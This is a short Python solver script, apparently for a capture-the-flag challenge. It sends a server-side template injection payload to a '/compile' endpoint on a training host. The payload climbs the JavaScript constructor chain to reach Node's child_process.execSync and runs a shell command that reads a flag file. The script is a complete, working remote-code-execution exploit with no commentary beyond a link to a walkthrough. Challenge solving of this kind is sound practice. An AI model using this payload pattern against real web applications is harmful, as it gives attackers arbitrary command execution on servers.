import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

BASE_URL = "https://michelangelo-1.quoccacorp.com"

class Solver:
    def __init__(self):
        self.session = get_session()

    def main(self):
        # https://infosecwriteups.com/nunchucks-from-hackthebox-detailed-walkthrough-c09ba0f276fa#:~:text=Payload%20for%20ssti
        PAYLOAD = """{{range.constructor("return global.process.mainModule.require('child_process').execSync('cat ../flag')")()}}"""
        response = self.session.post(f"{BASE_URL}/compile", json={"content": PAYLOAD})
        find_flag(response.text)

if __name__ == "__main__":
    Solver().main()
